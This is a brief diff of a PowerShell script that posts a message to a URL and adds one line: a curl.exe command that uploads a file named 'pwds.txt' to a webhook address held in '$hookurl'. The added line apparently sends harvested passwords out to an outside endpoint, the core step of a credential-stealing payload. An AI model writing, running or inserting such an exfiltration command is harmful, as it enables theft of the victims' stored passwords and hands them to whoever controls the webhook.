@@ -11,3 +11,4 @@ $msg = @{
 } | ConvertTo-Json
 
 Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "multipart/form-data" | Out-Null
+curl.exe -F "file1=@pwds.txt" $hookurl
